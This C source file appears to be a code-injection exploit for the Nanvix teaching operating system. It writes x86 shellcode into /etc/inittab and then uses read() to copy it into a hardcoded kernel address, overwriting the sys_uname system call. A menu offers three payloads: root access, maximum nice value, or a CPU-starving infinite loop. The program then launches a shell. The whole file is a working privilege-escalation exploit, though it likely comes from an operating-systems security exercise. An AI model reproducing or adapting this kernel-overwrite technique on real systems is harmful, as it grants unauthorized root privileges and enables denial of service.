#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/utsname.h>

#define INITTAB_SIZE 10
#define LINE_SIZE 80

#define VICTIM_FILE "/etc/inittab"
#define KERNEL_MEMORY 0xc0112999

/*
 * Shell code source.
 */
static const unsigned char ss[] =
"\x55\x89\xe5\xa1\x8c\x71\x11\xc0\xc7\x80\x14\x01\x00\x00\x00"
"\x00\x00\x00\x8b\x80\x14\x01\x00\x00\x5d\xc3";

static const unsigned char scNice[] =
"\x55\x89\xe5\xa1\x8c\x71\x11\xc0\x8b\x80\x34\x01\x00\x00\xc7\x80"
"\x64\x01\x00\x00\x3c\x00\x00\x00\xb8\x07\x00\x00\x00\x5d\xc3\x90";

static const unsigned char scStarv[] =
"\x55\x89\xe5\xeb\xfe\x66\x90\x90";

/*
 * Backup of the original file.
 */
static char file[INITTAB_SIZE*LINE_SIZE];
static int countFile = 0;


/*============================================================================*
 *                     Operations with Shell code                             *
 *============================================================================*/
static int writeShell(int which)
{
	int fd;
	if ((fd = open(VICTIM_FILE, O_RDWR)) == -1)
		return (-1);

	switch(which)
	{
		case 0:
			for (size_t i = 0; i < sizeof(ss)-1; i++)
				write(fd, &ss[i], 1);
			break;

		case 1:
			for (size_t i = 0; i < sizeof(scNice)-1; i++)
				write(fd, &scNice[i], 1);
			break;

		case 2:
			for (size_t i = 0; i < sizeof(scStarv)-1; i++)
				write(fd, &scStarv[i], 1);
			break;
	}
	close(fd);

	return (0);
}

/*============================================================================*
 *                     Operations with the source file.                       *
 *============================================================================*/
static int backupFile()
{
	int fd;
	if ((fd = open(VICTIM_FILE, O_RDONLY)) == -1)
		return (-1);

	while(1)
	{
		char ch;
		if (read(fd, &ch, 1) < 1)
			return (0);
		
		file[countFile++] = ch;
	}

	close(fd);
	return (1);
}

static int restoreFile()
{
	int fd;
	if ((fd = open(VICTIM_FILE, O_TRUNC | O_WRONLY)) == -1)
		return (-1);

	for (int i = 0; i < countFile; i++)
		write(fd, &file[i], 1);

	close(fd);
	return (1);
}

int main()
{
	char buff[5];
	const char *args[] = {"tsh", NULL};
	
	setvbuf(stdout, NULL, _IONBF, BUFSIZ);

	printf("------------------------------------------------\n");
	printf("             Nanvix Code Injection\n");
	printf("------------------------------------------------\n");

	printf("Please choose one of the injectable codes below:\n");
	printf("0 - Root access\n");
	printf("1 - Maximum nice value\n");
	printf("2 - Die of starvation\n");

	printf("You want: ");
	fgets(buff, sizeof(buff), stdin);

	int opt = atoi(buff);
	if (opt >= 0 && opt <= 2)
	{
		/* Backup victim file. */
		backupFile();

		/* Write shell code in file. */
		writeShell(opt);

		/* Read shell code into memory, over sys_uname. */
		int fd;
		if ((fd = open(VICTIM_FILE, O_RDONLY)) == -1)
			return (-1);

		read(fd, (void*)KERNEL_MEMORY, sizeof(ss)-1);

		/* Restore victim file. */
		restoreFile();

		struct utsname name;
		uname(&name);

		execvp(args[0], (char * const *)args);
	}
	else
		printf("Unknown option!\n");
	return 0;
}
